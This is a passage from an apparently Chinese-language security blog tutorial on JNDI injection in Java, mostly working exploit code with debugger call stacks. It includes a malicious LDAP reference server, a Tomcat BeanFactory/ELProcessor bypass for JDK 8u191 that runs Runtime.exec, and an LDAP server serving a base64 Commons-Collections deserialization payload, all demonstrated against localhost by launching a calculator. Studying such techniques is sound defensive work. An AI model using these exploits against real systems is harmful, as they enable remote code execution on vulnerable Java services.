class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;Exploit&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDILDAPClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">RemoteObjectInterface</span> <span class="variable">remoteObject</span> <span class="operator">=</span> (RemoteObjectInterface)initialContext.lookup(<span class="string">&quot;ldap://localhost:1234/Calc&quot;</span>);</span><br><span class="line">        System.out.println(remoteObject.sayHello(<span class="string">&quot;I&#x27;m Jasper you motherfucker.&quot;</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>python3 -m http.server 7777 起一个HTTP Server，目录里放编译后的恶意Calc类，然后运行Server端，再运行Client端，成功执行代码。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695651368469-b64fcb4f-41b5-467e-8f49-dd62144dc18a.png" alt="image.png"></p><h3 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a>调试</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">getObjectFactoryFromReference:163, NamingManager</span><br><span class="line">getObjectInstance:189, DirectoryManager</span><br><span class="line">c_lookup:1085, LdapCtx</span><br><span class="line">p_lookup:542, ComponentContext</span><br><span class="line">lookup:177, PartialCompositeContext</span><br><span class="line">lookup:205, GenericURLContext</span><br><span class="line">lookup:94, ldapURLContext</span><br><span class="line">lookup:417, InitialContext</span><br><span class="line">main:6, JNDILDAPClient</span><br></pre></td></tr></table></figure><p>主要漏洞点的逻辑和JNDI操纵RMI是完全一样的，关键点在NamingManager里，这里不再重复分析了。<br>看调用栈也能发现，使用LDAP的话根本不会走进RegistryContext，这也是为什么能绕过trustURLCodebase。</p><h2 id="JNDI-加载本地恶意类"><a href="#JNDI-加载本地恶意类" class="headerlink" title="JNDI 加载本地恶意类"></a>JNDI 加载本地恶意类</h2><p>适用JDK版本：≥8u191<br>测试JDK版本：8u191<br>在8u191版本里，Oracle直接在VersionHelper12.java这个文件里加了trustURLCodebase，这下所有SPI在loadClass的时候，都被禁止远程加载Factory了。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695697231385-10a1c94c-189a-43a1-907c-bd5a445a5499.png" alt="image.png"><br>那么如何绕过呢？这里是选择利用本地组件。<br>之前分析过，在这里会新建工厂对象factory，并执行factory#getObjectInstance方法<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695697777191-4a509f73-ef0b-4a71-9ff4-88bb55705d35.png" alt="image.png"><br>那么如果客户端本地有一个Factory，它实现了ObjectFactory接口，并且重写的getObjectInstance方法里有可利用的gadgets，达到执行代码的效果，那么我们选择通过本地加载这个Factory，也能实现攻击。<br>Client本地可利用的Factory类的要求</p><ul><li>实现了ObjectFactory接口（上图的factory变量类型要求）</li><li>重写的getObjectInstance方法里有可利用的gadgets（实现攻击需要）</li></ul><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695698498930-84d11fe2-2ae3-406d-98d2-a0d2723d06a2.png" alt="image.png"><br>这里也不卖关子，利用的是Tomcat核心包里内置的BeanFactory类<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695698837123-4eea3d70-cb2a-490f-b0db-892aa4ab21d1.png" alt="image.png"><br>BeanFactory#getObjectInstance里有一个反射调用是可以利用的，我们完全可以在Server端构造出恶意命令。<br>这里不仔细分析参数构造了，感兴趣的师傅可以仔细研究研究。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695698956107-1f93031b-6cc9-4f90-831a-b12bc9f1d59d.png" alt="image.png"><br>注意：这种利用方式对SPI是什么没有要求的，RMI还是LDAP都是一样的，他们都会走到NamingManager里。</p><h3 id="利用方式-2"><a href="#利用方式-2" class="headerlink" title="利用方式"></a>利用方式</h3><p>这里以RMI服务为例</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIServerBypass8u191</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, (String) <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, (String) <span class="literal">null</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;faster=eval&quot;</span>));</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;faster&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>));</span><br><span class="line"></span><br><span class="line">        initialContext.bind(<span class="string">&quot;rmi://localhost:1099/Tomcat8bypass&quot;</span>, resourceRef);</span><br><span class="line">        System.out.println(<span class="string">&quot;JNDIRMIServer start...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIRMIClientBypass8u191</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(<span class="string">&quot;rmi://localhost:1099/Tomcat8bypass&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先加载Tomcat的依赖，再依次运行服务端和客户端，即可执行el表达式的代码。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695696578139-ba45c574-25b9-4a52-b5ea-1487d2e2bcbf.png" alt="image.png"></p><h3 id="调试-2"><a href="#调试-2" class="headerlink" title="调试"></a>调试</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getObjectFactoryFromReference:163, NamingManager</span><br><span class="line">getObjectInstance:319, NamingManager</span><br><span class="line">decodeObject:464, RegistryContext</span><br><span class="line">lookup:124, RegistryContext</span><br><span class="line">lookup:205, GenericURLContext</span><br><span class="line">lookup:417, InitialContext</span><br><span class="line">main:6, JNDIRMIClient</span><br></pre></td></tr></table></figure><p>前面流程和JNDIRMI完全一致，直接跳到NamingManager#getObjectFactoryFromReference<br>可以看到它从Client端本地获取到了Tomcat依赖里的BeanFactory，并创建factory实例对象返回。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695711233585-4bc9f1f9-75fa-4abc-8778-c947f61ce616.png" alt="image.png"><br>factory实例对象返回后，执行BeanFactory#getObjectInstance，这个函数是我们可以操纵执行EL表达式的。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695711427802-8b77583e-0426-44ae-8543-fe0a8d4cdcd2.png" alt="image.png"><br>单步步过，成功执行代码<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695711511249-33a06b67-1812-4c5b-a624-95aa668c33d6.png" alt="image.png"><br>至此，JNDI加载恶意本地类的利用分析结束。</p><h2 id="JNDI操纵LDAP触发反序列化"><a href="#JNDI操纵LDAP触发反序列化" class="headerlink" title="JNDI操纵LDAP触发反序列化"></a>JNDI操纵LDAP触发反序列化</h2><p>适用JDK版本：≥8u191<br>测试JDK版本：8u191<br>同样是高版本的一种绕过手段，之前操纵LDAP是绑定的Reference对象，走的是类加载的路子。<br>实际上LDAP里有逻辑识别我们绑定的对象的类型，如果服务端绑一个序列化的字符串，就会有反序例化的点。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695720125409-df06e311-e27b-43f0-be0c-9ecce62376a8.png" alt="image.png"><br>走反序列化解析，可以看到调用了原生反序列化，显然是可以触发漏洞的。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1695729076498-0957f66c-73ac-4fb4-b548-fefa45cf20aa.png" alt="image.png"><br>这里我们用CC打，这就要求JNDIClient端有CC依赖，笔者用的CC6的链子，8u191低版本链子不适用。</p><h3 id="利用方式-3"><a href="#利用方式-3" class="headerlink" title="利用方式"></a>利用方式</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--        CC依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDILDAPServerBypass8u191</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( String[] tmp_args )</span> &#123;</span><br><span class="line">        <span class="comment">// 远程类加载用的codebase，这里没用</span></span><br><span class="line">        String[] args=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;http://127.0.0.1/#EXP&quot;</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1234</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(args[<span class="number">0</span>])));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span><span class="params">(InMemoryInterceptedSearchResult result, String base, Entry e)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="comment">//反序列化点</span></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, Base64.getDecoder().decode(</span><br><span class="line">                    <span class="string">&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAAEa2V5MnNyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABHNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWVwdAAJZ2V0TWV0aG9kdXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAcc3EAfgATdXEAfgAYAAAAAnBwdAAGaW52b2tldXEAfgAcAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VxAH4AGAAAAAF0AARDYWxjdAAEZXhlY3VxAH4AHAAAAAFxAH4AH3NxAH4AAD9AAAAAAAAMdwgAAAAQAAAAAXQABGtleTF0AAZ2YWx1ZTF4eHQABkphc3Blcng=&quot;</span></span><br><span class="line">            ));</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDILDAPCientBypass8u191</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// lookup参数注入触发</span></span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        context.lookup(<span class="string">&quot;ldap://localhost:1234/EXP&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="comment">// 输出Base64后的对象</span></span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">    out.writeObject(o);</span><br><span class="line">    out.close();</span><br><span class="line">    <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">    System.out.println(<span class="string">&quot;res = &quot;</span> + res);</span><br><span class="line">    System.out.println(<span 